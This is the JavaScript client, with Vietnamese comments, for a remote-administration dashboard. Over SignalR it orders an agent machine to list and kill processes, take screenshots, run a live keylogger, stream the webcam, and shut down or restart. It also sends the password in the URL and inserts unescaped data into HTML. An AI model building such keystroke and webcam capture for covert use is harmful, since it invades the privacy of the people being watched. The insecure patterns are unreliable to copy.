// --- CÁC HẰNG SỐ VÀ KHỞI TẠO CHUNG ---
const connectionUrl = "http://localhost:5000/clienthub"; 
let connection = null;
let currentView = 'applications';
let agentId = 'Agent_12345'; 
let currentUser = ''; // Lưu user hiện tại

document.getElementById('agent-id-display').textContent = agentId;

let globalProcessData = []; 
let currentSort = { column: 'pid', direction: 'asc' }; 

// --- HÀM SIGNALR VÀ GIAO TIẾP ---

async function sendCommand(action, params = {}) {
    const command = { action: action, params: params };
    console.log(`[CLIENT] Gửi lệnh: ${action}`, command);

    if (connection && connection.state === signalR.HubConnectionState.Connected) {
        try {
            await connection.invoke("SendToAgent", agentId, command);
        } catch (err) {
            console.error("Lỗi khi gửi lệnh SignalR:", err);
            updateStatus(`Lỗi khi gửi lệnh: ${err.message}`, 'error');
        }
    } else {
        updateStatus("Chưa kết nối đến Server.", 'warning');
    }
}

function startSignalR(username, password) {
    return new Promise((resolve, reject) => {
        // Gửi cả username và password qua query string
        const finalUrl = `${connectionUrl}?username=${encodeURIComponent(username)}&access_token=${encodeURIComponent(password)}`;

        connection = new signalR.HubConnectionBuilder()
            .withUrl(finalUrl)
            .withAutomaticReconnect()
            .build();

        connection.on("ReceiveResponse", (response) => {
            console.log("[SERVER] Nhận Response:", response);
            handleResponse(response);
        });

        connection.on("ReceiveUpdate", (update) => {
            handleRealtimeUpdate(update);
        });

        connection.on("ReceiveBinaryChunk", (data) => {
            handleBinaryStream(data);
        });

        connection.onclose((error) => {
            updateStatus("Mất kết nối. Đang thử lại...", 'error');
            // Nếu lỗi do authentication (401 hoặc connection closed) thì logout
            if(error && (error.message.includes("StatusCode: 401") || error.message.includes("closed"))) {
                // Chỉ logout nếu đang ở màn hình Dashboard, tránh loop ở màn login
                if (!document.getElementById('app').classList.contains('hidden')) {
                    doLogout();
                }
            }
        });

        connection.onreconnecting(() => updateStatus("Đang kết nối lại...", 'warning'));
        
        connection.onreconnected(() => {
            updateStatus("Đã kết nối an toàn", 'success');
            document.getElementById('status-dot').className = "w-2.5 h-2.5 rounded-full bg-green-500 animate-pulse";
        });

        connection.start()
            .then(() => {
                updateStatus(`Đã kết nối an toàn`, 'success');
                document.getElementById('status-dot').className = "w-2.5 h-2.5 rounded-full bg-green-500 animate-pulse";
                refreshCurrentViewData();
                resolve();
            })
            .catch(err => {
                // Lỗi kết nối ban đầu (bao gồm sai pass) sẽ rơi vào đây
                console.error("Lỗi kết nối: ", err);
                reject(err);
            });
    });
}

function refreshCurrentViewData() {
    if (currentView === 'applications') sendCommand('app_list');
    if (currentView === 'processes') sendCommand('process_list');
}

// --- XỬ LÝ LOGIN / LOGOUT ---

function doLogin(username, password) {
    const btnText = document.getElementById('btn-text');
    const btnLoader = document.getElementById('btn-loader');
    const errorMsg = document.getElementById('login-error');
    const loginBtn = document.getElementById('login-btn');

    // UI Loading state
    btnText.textContent = "Đang xác thực...";
    btnLoader.classList.remove('hidden');
    errorMsg.classList.add('hidden');
    loginBtn.disabled = true;

    // Gọi hàm kết nối
    startSignalR(username, password)
        .then(() => {
            // 1. Đăng nhập thành công -> Chuyển màn hình
            currentUser = username;
            document.getElementById('user-display').textContent = `Hi, ${username}`;
            
            const loginScreen = document.getElementById('login-screen');
            const appScreen = document.getElementById('app');

            loginScreen.classList.add('opacity-0');
            setTimeout(() => {
                loginScreen.classList.add('hidden');
                appScreen.classList.remove('hidden');
                setTimeout(() => appScreen.classList.remove('opacity-0'), 50);
            }, 500);
        })
        .catch((err) => {
            // 2. Đăng nhập thất bại (Sai pass hoặc lỗi Server) -> Ở lại màn hình login và báo lỗi
            console.log("Login failed:", err);
            
            btnText.textContent = "Đăng Nhập";
            btnLoader.classList.add('hidden');
            
            // Hiển thị thông báo lỗi
            errorMsg.classList.remove('hidden');
            // Reset nút bấm
            loginBtn.disabled = false;
        });
}

function doLogout() {
    if (connection) connection.stop();
    location.reload(); 
}

// --- HÀM XỬ LÝ PHẢN HỒI ---

let screenshotPending = false;

function handleResponse(data) {
    if (!data) return;

    if (currentView === 'applications' && Array.isArray(data.response)) {
        updateAppTable(data.response);
    } 
    else if (currentView === 'processes' && Array.isArray(data.response)) {
        globalProcessData = data.response;
        updateProcessTable(); 
    }
    else if (currentView === 'system') {
        if (data.response === 'ok' || data.response === 'done') {
             showModal("Thành Công", "Lệnh đã được gửi thành công đến Agent.", false, true);
        }
    }
    else if (currentView === 'keylogger' && data.response === 'stopped') {
        document.getElementById('keylogger-status').textContent = "Trạng thái: Đã dừng.";
    }
    else if (data.response === 'done' || data.response === 'ok' || data.response === 'started' || data.response === 'stopped' || data.response === 'killed') {
        console.log("Command executed successfully: " + data.response);
        if (data.response === 'stopped' && currentView === 'applications') sendCommand('app_list');
        if (data.response === 'killed' && currentView === 'processes') sendCommand('process_list');
    }
}

function handleRealtimeUpdate(data) {
    if (currentView === 'keylogger' && data.event === 'key_pressed' && data.data) {
        const logArea = document.getElementById('keylogger-log');
        if (logArea) {
            logArea.value += data.data;
            logArea.scrollTop = logArea.scrollHeight;
        }
    }
}

function handleBinaryStream(data) {
    const view = currentView;
    
    if (view === 'screenshot' && screenshotPending) {
        const imgElement = document.getElementById('screenshot-image');
        const placeholder = document.getElementById('screenshot-placeholder');
        
        if (imgElement && data.startsWith("data:")) {
            imgElement.src = data;
            imgElement.style.display = 'block';
            placeholder.style.display = 'none';
            document.getElementById('save-screenshot-btn').classList.remove('hidden');
            screenshotPending = false;
            updateStatus("Đã nhận ảnh.", 'success');
        }
    }
    
    if (view === 'webcam') {
        const videoElement = document.getElementById('webcam-stream');
        const placeholder = document.getElementById('webcam-placeholder');
        if (videoElement && data.startsWith("data:image")) {
            if (placeholder) placeholder.style.display = 'none';
            videoElement.style.display = 'block';
            videoElement.src = data;
        }
    }
}

// --- LOGIC SẮP XẾP TIẾN TRÌNH (TAM GIÁC) ---

function sortProcessTable(column) {
    if (currentSort.column === column) {
        currentSort.direction = currentSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        currentSort.column = column;
        currentSort.direction = 'desc'; 
        if (column === 'name') currentSort.direction = 'asc'; 
    }
    updateProcessTable();
}

// Tạo icon lần đầu
function getSortIcon(column) {
    const active = currentSort.column === column;
    
    const iconName = active 
        ? (currentSort.direction === 'asc' ? 'fa-caret-down' : 'fa-caret-up')
        : 'fa-caret-right';
    
    const styleClass = active 
        ? 'text-blue-600 bg-blue-50 border-blue-200 shadow-sm ring-1 ring-blue-200' 
        : 'text-gray-400 bg-gray-50 border-gray-200 hover:bg-gray-100 hover:text-gray-600';

    return `<span class="sort-btn ml-2 w-5 h-5 inline-flex items-center justify-center rounded-md border ${styleClass} transition-all cursor-pointer" title="Sắp xếp">
        <i class="fas ${iconName} text-xs"></i>
    </span>`;
}

// Cập nhật icon khi bấm (Sửa lỗi: Đồng nhất icon Caret)
function updateSortIcons() {
    ['pid', 'name', 'cpu', 'mem'].forEach(col => {
        const span = document.querySelector(`th[onclick="sortProcessTable('${col}')"] span`);
        const icon = span ? span.querySelector('i') : null;
        
        if (span && icon) {
            const active = currentSort.column === col;
            span.className = "sort-btn ml-2 w-5 h-5 inline-flex items-center justify-center rounded-md border transition-all cursor-pointer";
            
            if (active) {
                span.classList.add('text-blue-600', 'bg-blue-50', 'border-blue-200', 'shadow-sm', 'ring-1', 'ring-blue-200');
                icon.className = `fas ${currentSort.direction === 'asc' ? 'fa-caret-down' : 'fa-caret-up'} text-xs`;
            } else {
                span.classList.add('text-gray-400', 'bg-gray-50', 'border-gray-200', 'hover:bg-gray-100', 'hover:text-gray-600');
                icon.className = 'fas fa-caret-right text-xs';
            }
        }
    });
}

// --- HÀM CẬP NHẬT UI ---

function updateStatus(message, type) {
    const statusEl = document.getElementById('status-display');
    const statusDot = document.getElementById('status-dot');
    
    statusEl.textContent = message;
    
    if (type === 'success') {
        statusEl.className = "text-xs font-semibold text-green-600 uppercase tracking-wide";
        statusDot.className = "w-2.5 h-2.5 rounded-full bg-green-500 animate-pulse";
    } else if (type === 'error') {
        statusEl.className = "text-xs font-semibold text-red-600 uppercase tracking-wide";
        statusDot.className = "w-2.5 h-2.5 rounded-full bg-red-500";
    } else {
        statusEl.className = "text-xs font-semibold text-yellow-600 uppercase tracking-wide";
        statusDot.className = "w-2.5 h-2.5 rounded-full bg-yellow-500 animate-ping";
    }
}

function showModal(title, message, onConfirm = null, isInfo = false) {
    const container = document.getElementById('modal-container');
    const titleEl = document.getElementById('modal-title');
    const messageEl = document.getElementById('modal-message');
    const confirmBtn = document.getElementById('modal-confirm-btn');
    const cancelBtn = document.getElementById('modal-cancel-btn');

    titleEl.textContent = title;
    messageEl.textContent = message;

    if (isInfo) {
        confirmBtn.textContent = 'Đóng';
        confirmBtn.className = 'px-5 py-2.5 bg-blue-600 text-white font-medium rounded-xl hover:bg-blue-700 transition-colors';
        cancelBtn.classList.add('hidden');
    } else {
        confirmBtn.textContent = 'Xác Nhận';
        confirmBtn.className = 'px-5 py-2.5 bg-red-600 text-white font-medium rounded-xl hover:bg-red-700 shadow-lg shadow-red-200 transition-all';
        cancelBtn.classList.remove('hidden');
    }

    const newConfirmBtn = confirmBtn.cloneNode(true);
    confirmBtn.parentNode.replaceChild(newConfirmBtn, confirmBtn);
    const newCancelBtn = cancelBtn.cloneNode(true);
    cancelBtn.parentNode.replaceChild(newCancelBtn, cancelBtn);

    newConfirmBtn.onclick = () => {
        container.classList.add('hidden');
        if (!isInfo && onConfirm) onConfirm();
    };
    newCancelBtn.onclick = () => container.classList.add('hidden');
    container.classList.remove('hidden');
}

function getLoadingRow(colspan) {
    return `<tr><td colspan="${colspan}" class="px-6 py-8 text-center"><div class="loader mb-2"></div><span class="text-gray-500 text-sm">Đang tải dữ liệu từ Agent...</span></td></tr>`;
}

function getEmptyRow(colspan) {
    return `<tr><td colspan="${colspan}" class="px-6 py-8 text-center text-gray-500 italic">Không có dữ liệu nào được tìm thấy.</td></tr>`;
}

function switchView(view) {
    currentView = view;
    const contentArea = document.getElementById('content-area');
    
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelector(`[data-view="${view}"]`).classList.add('active');

    let html = '';
    switch (view) {
        case 'applications':
            html = renderAppLayout(); 
            setTimeout(() => sendCommand('app_list'), 100);
            break;
        case 'processes':
            html = renderProcessLayout();
            setTimeout(() => sendCommand('process_list'), 100);
            break;
        case 'screenshot':
            html = renderScreenshotView();
            break;
        case 'keylogger':
            html = renderKeyloggerDisplay();
            break;
        case 'webcam':
            html = renderWebcamControl();
            break;
        case 'system':
            html = renderSystemControls();
            break;
    }
    contentArea.innerHTML = html;
    attachViewListeners(view);
}

// 1. Ứng Dụng
function renderAppLayout() {
    return `
        <div class="space-y-4">
            <div class="flex items-center space-x-3">
                <button id="list-apps-btn" class="btn-primary bg-blue-600 text-white px-4 py-2 rounded-lg shadow hover:bg-blue-700 transition-all">
                    <i class="fas fa-sync-alt mr-2"></i> Làm Mới
                </button>
                <input id="app-start-name" type="text" placeholder="Tên ứng dụng (.exe) để mở" class="p-2 border border-gray-300 rounded-lg flex-grow max-w-xs">
                <button id="start-app-btn" class="btn-primary bg-green-600 text-white px-4 py-2 rounded-lg shadow hover:bg-green-700 transition-all">
                    <i class="fas fa-play mr-2"></i> Mở App
                </button>
            </div>
            <div class="table-container bg-gray-50 rounded-lg shadow-inner">
                <table class="min-w-full divide-y divide-gray-200">
                    <thead class="bg-gray-200 sticky top-0">
                        <tr>
                            <th class="px-6 py-3 text-left text-xs font-bold text-gray-700 uppercase">Tên Ứng Dụng</th>
                            <th class="px-6 py-3 text-left text-xs font-bold text-gray-700 uppercase">Đường Dẫn</th>
                            <th class="px-6 py-3 text-left text-xs font-bold text-gray-700 uppercase">Trạng Thái</th>
                            <th class="px-6 py-3 text-center text-xs font-bold text-gray-700 uppercase">Thao Tác</th>
                        </tr>
                    </thead>
                    <tbody id="app-list-body" class="bg-white divide-y divide-gray-200">
                        ${getLoadingRow(4)}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}

function updateAppTable(apps) {
    const tbody = document.getElementById('app-list-body');
    if (!tbody) return;

    if (!apps || apps.length === 0) {
        tbody.innerHTML = getEmptyRow(4);
        return;
    }

    tbody.innerHTML = apps.map(app => `
        <tr>
            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${app.name || 'Unknown'}</td>
            <td class="px-6 py-4 whitespace-nowrap text-xs text-gray-500 truncate max-w-xs" title="${app.path}">${app.path || 'N/A'}</td>
            <td class="px-6 py-4 whitespace-nowrap">
                <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${app.status === 'Running' ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-800'}">
                    ${app.status || 'Installed'}
                </span>
            </td>
            <td class="px-6 py-4 whitespace-nowrap text-center text-sm font-medium">
                <button data-action="stop-app" data-id="${app.name}" class="bg-red-50 text-red-600 px-3 py-1 rounded hover:bg-red-100 hover:text-red-900 transition-colors disabled:opacity-50 flex items-center mx-auto" ${app.status === 'Closed' ? 'disabled' : ''}>
                    <i class="fas fa-times-circle mr-1"></i> Đóng
                </button>
            </td>
        </tr>
    `).join('');
}

// 2. Tiến Trình (Đã cập nhật Header)
function renderProcessLayout() {
    return `
        <div class="space-y-4">
            <div class="flex flex-wrap items-center justify-between gap-4">
                <div class="flex items-center space-x-3">
                    <button id="list-processes-btn" class="btn-primary bg-blue-600 text-white px-4 py-2 rounded-lg shadow hover:bg-blue-700 transition-all">
                        <i class="fas fa-sync-alt mr-2"></i> Cập Nhật
                    </button>
                    <input id="process-search" type="text" placeholder="Tìm PID hoặc Tên..." class="p-2 border border-gray-300 rounded-lg w-48">
                    <button id="start-process-btn" class="btn-primary bg-green-600 text-white px-4 py-2 rounded-lg shadow hover:bg-green-700 transition-all">
                        <i class="fas fa-plus mr-2"></i> Mở Process
                    </button>
                </div>
                <div class="bg-gray-100 px-4 py-2 rounded-lg border border-gray-300 text-sm font-mono text-gray-700">
                    <span id="total-cpu" class="mr-4 font-bold text-blue-600">CPU: 0%</span>
                    <span id="total-mem" class="font-bold text-purple-600">RAM: 0 MB</span>
                </div>
            </div>
            
            <div class="table-container bg-gray-50 rounded-lg shadow-inner">
                <table class="min-w-full divide-y divide-gray-200">
                    <thead class="bg-gray-200 sticky top-0 select-none">
                        <tr>
                            <th class="px-6 py-3 text-left text-xs font-bold text-gray-700 uppercase cursor-pointer group" onclick="sortProcessTable('pid')">
                                <div class="flex items-center">PID ${getSortIcon('pid')}</div>
                            </th>
                            <th class="px-6 py-3 text-left text-xs font-bold text-gray-700 uppercase cursor-pointer group" onclick="sortProcessTable('name')">
                                <div class="flex items-center">Tên Tiến Trình ${getSortIcon('name')}</div>
                            </th>
                            <th class="px-6 py-3 text-left text-xs font-bold text-gray-700 uppercase cursor-pointer group" onclick="sortProcessTable('cpu')">
                                <div class="flex items-center">CPU ${getSortIcon('cpu')}</div>
                            </th>
                            <th class="px-6 py-3 text-left text-xs font-bold text-gray-700 uppercase cursor-pointer group" onclick="sortProcessTable('mem')">
                                <div class="flex items-center">RAM ${getSortIcon('mem')}</div>
                            </th>
                            <th class="px-6 py-3 text-center text-xs font-bold text-gray-700 uppercase">Thao Tác</th>
                        </tr>
                    </thead>
                    <tbody id="process-list-body" class="bg-white divide-y divide-gray-200">
                        ${getLoadingRow(5)}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}

function updateProcessTable() {
    const processes = globalProcessData;
    const tbody = document.getElementById('process-list-body');
    const totalCpuEl = document.getElementById('total-cpu');
    const totalMemEl = document.getElementById('total-mem');

    if (!tbody) return;

    if (!processes || processes.length === 0) {
        tbody.innerHTML = getEmptyRow(5);
        if(totalCpuEl) totalCpuEl.textContent = "CPU: 0%";
        if(totalMemEl) totalMemEl.textContent = "RAM: 0 MB";
        return;
    }

    let totalCpu = 0;
    let totalMem = 0;

    processes.forEach(p => {
        const cpuVal = parseFloat(p.cpu.replace('%', '')) || 0;
        totalCpu += cpuVal;
        const memVal = parseFloat(p.mem.replace(' MB', '').replace(',', '')) || 0;
        totalMem += memVal;
    });

    if(totalCpuEl) totalCpuEl.textContent = `CPU: ${totalCpu.toFixed(1)}%`;
    if(totalMemEl) totalMemEl.textContent = `RAM: ${totalMem.toFixed(0)} MB`;

    const sortedProcesses = [...processes].sort((a, b) => {
        let valA, valB;
        switch (currentSort.column) {
            case 'pid':
                valA = a.pid;
                valB = b.pid;
                break;
            case 'name':
                valA = a.name.toLowerCase();
                valB = b.name.toLowerCase();
                break;
            case 'cpu':
                valA = parseFloat(a.cpu.replace('%', '')) || 0;
                valB = parseFloat(b.cpu.replace('%', '')) || 0;
                break;
            case 'mem':
                valA = parseFloat(a.mem.replace(' MB', '').replace(',', '')) || 0;
                valB = parseFloat(b.mem.replace(' MB', '').replace(',', '')) || 0;
                break;
            default: return 0;
        }
        if (valA < valB) return currentSort.direction === 'asc' ? -1 : 1;
        if (valA > valB) return currentSort.direction === 'asc' ? 1 : -1;
        return 0;
    });

    tbody.innerHTML = sortedProcesses.map(p => `
        <tr>
            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-gray-600">${p.pid}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 truncate max-w-xs" title="${p.name}">${p.name}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500 font-semibold ${parseFloat(p.cpu) > 50 ? 'text-red-600' : ''}">${p.cpu || '0%'}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${p.mem || '0 MB'}</td>
            <td class="px-6 py-4 whitespace-nowrap text-center text-sm font-medium">
                <button data-action="kill-process" data-id="${p.pid}" class="text-red-600 hover:text-red-900 transition-colors">
                    <i class="fas fa-times-circle"></i> Kill
                </button>
            </td>
        </tr>
    `).join('');
    
    updateSortIcons();
}

function updateSortIcons() {
    ['pid', 'name', 'cpu', 'mem'].forEach(col => {
        const span = document.querySelector(`th[onclick="sortProcessTable('${col}')"] span`);
        const icon = span ? span.querySelector('i') : null;
        
        if (span && icon) {
            const active = currentSort.column === col;
            span.className = "sort-btn ml-2 w-5 h-5 inline-flex items-center justify-center rounded-md border transition-all cursor-pointer";
            
            if (active) {
                span.classList.add('text-blue-600', 'bg-blue-50', 'border-blue-200', 'shadow-sm', 'ring-1', 'ring-blue-200');
                icon.className = `fas ${currentSort.direction === 'asc' ? 'fa-caret-down' : 'fa-caret-up'} text-xs`;
            } else {
                span.classList.add('text-gray-400', 'bg-gray-50', 'border-gray-200', 'hover:bg-gray-100', 'hover:text-gray-600');
                icon.className = 'fas fa-caret-right text-xs';
            }
        }
    });
}

// 3. Các View khác
function renderScreenshotView() {
    return `
        <div class="space-y-6">
            <button id="capture-screenshot-btn" class="btn-primary bg-blue-600 text-white px-6 py-3 rounded-lg shadow hover:bg-blue-700 transition-all font-semibold">
                <i class="fas fa-camera mr-2"></i> Yêu Cầu Chụp Màn Hình
            </button>
            <div id="screenshot-area" class="bg-gray-100 border-2 border-dashed border-gray-300 rounded-lg p-6 text-center min-h-[300px] flex flex-col items-center justify-center">
                <p class="text-gray-500 mb-4" id="screenshot-placeholder">Hình ảnh chụp màn hình sẽ xuất hiện ở đây.</p>
                <img id="screenshot-image" src="" alt="Màn hình Agent" class="hidden max-w-full h-auto mx-auto rounded-lg shadow-lg border border-gray-200">
            </div>
            <button id="save-screenshot-btn" class="btn-primary bg-green-600 text-white px-6 py-3 rounded-lg shadow hover:bg-green-700 transition-all font-semibold hidden">
                <i class="fas fa-download mr-2"></i> Lưu Ảnh
            </button>
        </div>
    `;
}

function renderKeyloggerDisplay() {
    return `
        <div class="space-y-4">
            <div class="flex space-x-3">
                <button id="start-keylogger-btn" class="btn-primary bg-green-600 text-white px-4 py-2 rounded-lg shadow hover:bg-green-700 transition-all font-semibold">
                    <i class="fas fa-play mr-2"></i> Bắt Đầu
                </button>
                <button id="stop-keylogger-btn" class="btn-primary bg-red-600 text-white px-4 py-2 rounded-lg shadow hover:bg-red-700 transition-all font-semibold">
                    <i class="fas fa-stop mr-2"></i> Dừng
                </button>
                <button id="clear-keylogger-btn" class="btn-primary bg-gray-500 text-white px-4 py-2 rounded-lg shadow hover:bg-gray-600 transition-all font-semibold">
                    <i class="fas fa-eraser mr-2"></i> Xóa
                </button>
            </div>
            <p id="keylogger-status" class="text-sm font-medium text-blue-600">Trạng thái: Đang chờ lệnh...</p>
            <textarea id="keylogger-log" class="w-full h-80 p-4 border-2 border-gray-300 rounded-lg font-mono text-sm resize-none bg-gray-50" readonly></textarea>
        </div>
    `;
}

function renderWebcamControl() {
    return `
        <div class="space-y-6">
            <p class="text-lg font-semibold text-red-600 bg-red-100 p-3 rounded-lg shadow">
                <i class="fas fa-exclamation-triangle mr-2"></i> CẢNH BÁO: Truy cập Webcam Agent.
            </p>
            <div class="flex space-x-3">
                <button id="webcam-on-btn" class="btn-primary bg-green-600 text-white px-6 py-3 rounded-lg shadow hover:bg-green-700 transition-all font-semibold">
                    <i class="fas fa-video mr-2"></i> Bật Webcam
                </button>
                <button id="webcam-off-btn" class="btn-primary bg-red-600 text-white px-6 py-3 rounded-lg shadow hover:bg-red-700 transition-all font-semibold">
                    <i class="fas fa-stop mr-2"></i> Tắt Webcam
                </button>
            </div>
            <div id="webcam-area" class="bg-gray-900 border-2 border-gray-700 rounded-lg p-2 text-center overflow-hidden min-h-[300px] flex items-center justify-center relative">
                 <span id="webcam-placeholder" class="text-gray-500"><i class="fas fa-video-slash fa-2x"></i><br>Webcam đang tắt</span>
                <img id="webcam-stream" src="" alt="Video Webcam Agent" class="w-full h-auto rounded-md hidden" />
            </div>
        </div>
    `;
}

function renderSystemControls() {
    return `
        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 max-w-2xl mx-auto pt-10">
            <div class="p-6 bg-red-50 rounded-lg shadow-lg border-l-4 border-red-500">
                <h3 class="text-xl font-bold text-red-800 mb-3">Tắt Nguồn (Shutdown)</h3>
                <p class="text-gray-600 mb-4">Lệnh: shutdown /s /t 0</p>
                <button id="shutdown-btn" class="w-full btn-primary bg-red-600 text-white px-4 py-2 rounded-lg shadow hover:bg-red-700 transition-all font-semibold">
                    <i class="fas fa-power-off mr-2"></i> SHUTDOWN
                </button>
            </div>
            <div class="p-6 bg-yellow-50 rounded-lg shadow-lg border-l-4 border-yellow-500">
                <h3 class="text-xl font-bold text-yellow-800 mb-3">Khởi Động Lại (Restart)</h3>
                <p class="text-gray-600 mb-4">Lệnh: shutdown /r /t 0</p>
                <button id="restart-btn" class="w-full btn-primary bg-yellow-600 text-white px-4 py-2 rounded-lg shadow hover:bg-yellow-700 transition-all font-semibold">
                    <i class="fas fa-redo-alt mr-2"></i> RESTART
                </button>
            </div>
        </div>
    `;
}

// --- EVENT LISTENERS ---

function attachViewListeners(view) {
    switch (view) {
        case 'applications':
            document.getElementById('list-apps-btn').onclick = () => {
                    document.getElementById('app-list-body').innerHTML = getLoadingRow(4);
                    sendCommand('app_list');
            };
            document.getElementById('start-app-btn').onclick = () => {
                const name = document.getElementById('app-start-name').value;
                if (name) sendCommand('app_start', { name: name });
            };
            document.getElementById('app-list-body').addEventListener('click', (e) => {
                const btn = e.target.closest('button[data-action="stop-app"]');
                if (btn) {
                    const name = btn.getAttribute('data-id');
                    showModal("Dừng Ứng Dụng", `Dừng ứng dụng "${name}"?`, () => sendCommand('app_stop', { name: name }));
                }
            });
            break;

        case 'processes':
            document.getElementById('list-processes-btn').onclick = () => {
                document.getElementById('process-list-body').innerHTML = getLoadingRow(5);
                sendCommand('process_list');
            };
            document.getElementById('start-process-btn').onclick = () => {
                const path = document.getElementById('process-start-path').value;
                if (path) sendCommand('process_start', { name: path });
            };
            document.getElementById('process-list-body').addEventListener('click', (e) => {
                const btn = e.target.closest('button[data-action="kill-process"]');
                if (btn) {
                    const pid = btn.getAttribute('data-id');
                    showModal("Kill Process", `Chấm dứt tiến trình PID ${pid}?`, () => sendCommand('process_stop', { pid: parseInt(pid) }));
                }
            });
            document.getElementById('process-search').addEventListener('keyup', (e) => {
                const term = e.target.value.toLowerCase();
                const rows = document.querySelectorAll('#process-list-body tr');
                rows.forEach(row => {
                    const text = row.innerText.toLowerCase();
                    row.style.display = text.includes(term) ? '' : 'none';
                });
            });
            break;

        case 'screenshot':
            document.getElementById('capture-screenshot-btn').onclick = () => {
                const img = document.getElementById('screenshot-image');
                img.src = '';
                img.style.display = 'none';
                document.getElementById('screenshot-placeholder').textContent = 'Đang chờ Agent chụp và gửi ảnh...';
                document.getElementById('screenshot-placeholder').style.display = 'block';
                document.getElementById('save-screenshot-btn').classList.add('hidden');
                screenshotPending = true;
                sendCommand('screenshot');
            };
            document.getElementById('save-screenshot-btn').onclick = () => {
                const img = document.getElementById('screenshot-image');
                if (img.src) {
                    let filename = prompt("Nhập tên file muốn lưu (Để trống sẽ dùng mặc định):");
                    if (!filename || filename.trim() === "") {
                        filename = `screenshot_${new Date().getTime()}.png`;
                    }
                    if (!filename.toLowerCase().endsWith('.png')) {
                        filename += '.png';
                    }
                    const link = document.createElement('a');
                    link.href = img.src;
                    link.download = filename;
                    link.click();
                }
            };
            break;

        case 'keylogger':
            document.getElementById('start-keylogger-btn').onclick = () => {
                sendCommand('keylogger_start');
                document.getElementById('keylogger-status').textContent = "Trạng thái: Đang Ghi...";
            };
            document.getElementById('stop-keylogger-btn').onclick = () => sendCommand('keylogger_stop');
            document.getElementById('clear-keylogger-btn').onclick = () => document.getElementById('keylogger-log').value = '';
            break;

        case 'webcam':
            document.getElementById('webcam-on-btn').onclick = () => {
                sendCommand('webcam_on');
                const placeholder = document.getElementById('webcam-placeholder');
                if(placeholder) placeholder.innerHTML = '<div class="loader mb-2"></div> Đang kết nối...';
            };
            document.getElementById('webcam-off-btn').onclick = () => sendCommand('webcam_off');
            break;

        case 'system':
            document.getElementById('shutdown-btn').onclick = () => {
                showModal("XÁC NHẬN TẮT NGUỒN", "CẢNH BÁO: Thao tác này sẽ TẮT NGUỒN máy Agent ngay lập tức.", () => sendCommand('shutdown'));
            };
            document.getElementById('restart-btn').onclick = () => {
                showModal("XÁC NHẬN KHỞI ĐỘNG LẠI", "CẢNH BÁO: Thao tác này sẽ KHỞI ĐỘNG LẠI máy Agent ngay lập tức.", () => sendCommand('restart'));
            };
            break;
    }
}

// --- INIT ---
document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            switchView(e.currentTarget.getAttribute('data-view'));
        });
    });

    // --- NEW: Bind Login/Logout events ---
    document.getElementById('login-form').addEventListener('submit', (e) => {
        e.preventDefault();
        const username = document.getElementById('username-input').value;
        const password = document.getElementById('password-input').value;
        doLogin(username, password);
    });

    document.getElementById('logout-btn').addEventListener('click', doLogout);

    // Switch view to default initially (but hidden)
    switchView(currentView);
});